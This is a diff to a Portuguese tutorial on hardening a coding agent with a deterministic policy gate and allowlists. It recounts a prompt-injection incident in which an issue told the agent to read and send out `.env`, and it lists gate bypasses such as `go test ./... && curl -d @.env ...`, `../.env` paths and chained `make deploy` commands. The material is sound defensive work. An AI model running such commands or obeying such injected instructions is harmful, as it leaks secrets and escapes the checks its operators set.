@@ -58,7 +58,8 @@ Na prática, a regra decide a configuração de cada sessão:
 - o agente que **lê o código privado e tem rede** não lê conteúdo externo;
 - o agente que **lê conteúdo externo e código privado** não tem saída.
 
-A combinação vale por sessão, e é verificável antes de a sessão começar.
+A combinação vale por sessão, e é verificável antes de a sessão começar: o executor do laboratório confere
+a sessão antes da primeira ação, e a sessão com as três não executa nada.
 
 ## Permissão mínima e ambiente isolado
 
@@ -66,9 +67,13 @@ O agente roda num **ambiente isolado**: sem credencial de produção, com um sis
 a rede restrita. Dentro dele, cada ação passa por um **portão de política**, uma função que recebe a sessão e
 a ação e devolve permitida ou negada:
 
-- **comandos:** só os da lista (`go test`, `go vet`, `make test`);
-- **destinos de rede:** só os da lista (o *proxy* de módulos, o registro espelhado);
-- **arquivos:** só os prefixos da tarefa; segredo, nunca, em nenhuma sessão;
+- **comandos:** só os da lista (`go test`, `go vet`, `make test`), comparados por palavra inteira, sem
+  metacaractere de shell (`;`, `&&`, `|`, `$`) e sem *flag* que execute outro programa (`-exec`, `-vettool`).
+  Sem isso, `go test ./... && curl -d @.env ...` começa com um comando permitido;
+- **destinos de rede:** só os da lista, por `https`, sem usuário nem porta no endereço e **por caminho**: o
+  próprio *proxy* de módulos é um canal de saída se o caminho for livre, porque o caminho do módulo leva dados;
+- **arquivos:** só os prefixos da tarefa, com o caminho normalizado (nada de `../`); segredo, nunca, em nenhuma
+  sessão, em qualquer caixa e nos nomes comuns (`.env`, `*.env`, `.env.*`, chaves, `id_rsa`, `secrets/`);
 - **ferramentas MCP:** só as da lista (marco 05).
 
 O portão é **puro e determinístico**: a mesma sessão e a mesma ação dão sempre a mesma decisão. Isso é o que o
@@ -95,7 +100,8 @@ registro público recebe a instalação de quem confiou na sugestão. A defesa �
 - uma **lista permitida** de dependências;
 - um **registro espelhado** local: o que não está no espelho não existe para o agente, mesmo que esteja na
   lista por engano;
-- o ***lock file*** com versão e *hash*, revisado no PR.
+- a **versão fixada** em cada instalação (o portão recusa `@latest`) e o ***lock file*** com versão e *hash*,
+  revisado no PR.
 
 O código gerado passa pelos mesmos SAST e SCA de `seguranca-aplicacao/13`. Ser gerado não é exceção.
 
@@ -117,14 +123,17 @@ ter sido convencida pelo mesmo texto que enganou o agente. E não do agente, que
 leu.
 
 Toda decisão do portão, permitida ou negada, vai para um **registro encadeado por *hash***
-(`entrega-continua-e-devops/09`): a negação é a evidência de que o controle funcionou, e a adulteração de
-qualquer entrada aparece.
+(`entrega-continua-e-devops/09`): a negação é a evidência de que o controle funcionou, e a adulteração de uma
+entrada, sem recalcular a cadeia, aparece. O *hash* cobre a entrada inteira, argumentos incluídos, numa
+serialização sem ambiguidade. Contra quem consegue reescrever o registro inteiro, recalcular a cadeia ou apagar a
+cauda, a defesa é **ancorar o último *hash* fora do alcance do agente** (outro serviço, ou um HMAC com chave que
+ele não tem).
 
 ## O mapa do OWASP
 
 A OWASP mantém duas listas, conferidas em 15 nov 2026:
 
-- o ***Top 10 for LLM Applications***, cuja **edição 2026** saiu entre ago e set de 2026. *Excessive Agency*,
+- o ***Top 10 for LLM Applications***, cuja **edição 2026** saiu em ago 2026. *Excessive Agency*,
   o agente com permissão demais, subiu para o terceiro lugar;
 - o ***Top 10 for Agentic Applications for 2026***, publicado em dez 2025, que começa por ***Agent Goal
   Hijack*** (o objetivo do agente sequestrado por conteúdo, como a issue do exemplo), ***Tool Misuse*** e
@@ -149,8 +158,8 @@ escondido, a instrução de ler o `.env` e mandá-lo para um endereço externo. 
 O `.env` daquele repositório só tinha credenciais de desenvolvimento, e foi por isso que o incidente não
 virou um vazamento. A correção:
 
-- a sessão de triagem perdeu a leitura de segredo e a rede ficou restrita ao *proxy* de módulos: duas das três
-  capacidades, não as três;
+- a sessão de triagem perdeu a leitura de segredo e a rede ficou restrita ao *proxy* de módulos, por caminho:
+  duas das três capacidades, não as três;
 - o portão passou a negar `.env`, chaves e `secrets/` em qualquer sessão, e a registrar cada decisão;
 - o validador de configuração passou a recusar a sessão que junta dado privado, conteúdo não confiável e
   saída.
@@ -182,8 +191,28 @@ sua versão limpa.
 6. **Toda decisão no registro encadeado.** As negações também entram; o registro íntegro passa, e a entrada
    adulterada (alguém transformando a negação da saída em permissão) é apontada pelo índice.
 
+**A revisão adversarial.** Um revisor separado tentou burlar o portão com ações novas, e achou mais de vinte
+caminhos. Os principais, todos fechados e com teste de regressão:
+
+- `httpd/.env` lia o segredo, porque o portão tratava como "conteúdo externo" qualquer alvo que começasse com
+  `http`; e `.env#x`, porque o `#` também. O externo passou a ser decidido pelo esquema da URL ou pelo formato
+  `issue#N`;
+- `limite/../.env`, `.ENV`, `producao.env`, `id_rsa`: o caminho passou a ser normalizado, e o segredo, reconhecido
+  em qualquer caixa;
+- `go test ./... && curl ...`, `go test -exec`, `make test && make deploy-producao`, `make testedeploy-producao`:
+  passavam pelo prefixo. O comando passou a ser comparado por palavra, sem metacaractere nem *flag* perigosa;
+- o segundo pacote do `go get` e o `@latest`: todo pacote passou a ser conferido, com versão fixada;
+- o segredo no caminho de uma URL do *proxy*: os destinos passaram a valer por caminho;
+- o `Executor` não validava a sessão, e a sessão com as três capacidades rodava;
+- a colisão pelo separador e os argumentos fora do *hash* do registro.
+
+Dois limites ficaram, cada um afirmado por um teste: o recálculo da cadeia inteira (a âncora externa é a defesa)
+e o valor de um segredo **codificado** (em base64) dentro de outro arquivo, que a remoção por valor conhecido
+não reconhece.
+
 **Medido:** todas passaram. Seis mutações do portão foram plantadas, uma de cada vez, e cada uma reprovou o
-teste certo:
+teste certo, e mais duas depois da revisão (desligar a checagem de metacaractere, desligar a validação no
+executor):
 
 - ler segredo;
 - liberar qualquer destino;
